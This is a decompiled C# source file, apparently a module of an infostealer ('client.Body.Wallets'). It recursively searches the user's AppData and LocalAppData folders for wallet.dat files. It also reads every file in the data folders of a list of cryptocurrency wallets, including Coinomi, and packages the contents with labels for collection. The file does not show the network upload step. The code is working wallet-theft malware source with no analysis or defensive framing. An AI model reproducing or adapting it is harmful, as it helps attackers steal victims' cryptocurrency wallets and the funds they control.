using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using client.Helpers;
using client.Models;
using client.Network;

namespace client.Body
{
	// Token: 0x0200004D RID: 77
	internal class Wallets
	{
		// Token: 0x060001BF RID: 447 RVA: 0x0000A3D0 File Offset: 0x000085D0
		public static List<DefaultFileStructure> Get()
		{
			List<DefaultFileStructure> list = new List<DefaultFileStructure>();
			list.AddRange(Wallets.ParseDat(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)));
			list.AddRange(Wallets.ParseDat(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)));
			list.AddRange(Wallets.ParseStatic());
			return list;
		}

		// Token: 0x060001C0 RID: 448 RVA: 0x0000A408 File Offset: 0x00008608
		private static List<DefaultFileStructure> ParseDat(string folder)
		{
			List<DefaultFileStructure> list = new List<DefaultFileStructure>();
			foreach (string text in ParserHelper.ParseFolders(folder, 3, "wallet.dat"))
			{
				byte[] fileContent = FileHelper.ReadFile(text);
				list.Add(new DefaultFileStructure
				{
					FileContent = fileContent,
					FileName = string.Join("\\", new string[]
					{
						new FileInfo(text).Directory.FullName.Replace(folder, null).Split(new char[]
						{
							'\\'
						}).First<string>(),
						"wallet.dat"
					}),
					Service = DataType.Wallets
				});
			}
			return list;
		}

		// Token: 0x060001C1 RID: 449 RVA: 0x0000A4D8 File Offset: 0x000086D8
		private static List<DefaultFileStructure> ParseStatic()
		{
			List<DefaultFileStructure> list = new List<DefaultFileStructure>();
			foreach (KeyValuePair<string, string> keyValuePair in Connection.wllts)
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				if (keyValuePair.Key == "Coinomi")
				{
					folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				}
				if (Directory.Exists(folderPath + keyValuePair.Value))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(folderPath + keyValuePair.Value).GetFiles())
					{
						list.Add(new DefaultFileStructure
						{
							FileContent = FileHelper.ReadFile(fileInfo.FullName),
							FileName = string.Join("\\", new string[]
							{
								keyValuePair.Key,
								fileInfo.Name
							}),
							Service = DataType.Wallets
						});
					}
				}
			}
			return list;
		}
	}
}
